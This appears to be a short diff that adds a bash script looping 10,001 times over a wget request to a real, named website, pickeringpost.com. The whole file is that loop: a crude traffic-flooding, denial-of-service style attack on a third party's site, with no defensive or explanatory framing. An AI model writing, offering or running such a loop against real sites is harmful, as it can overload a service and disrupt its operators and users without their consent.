@@ -1,0 +1,4 @@
+for i in {0..10000}
+do
+	wget http://pickeringpost.com/http://pickeringpost.com/http://pickeringpost.com/
+done
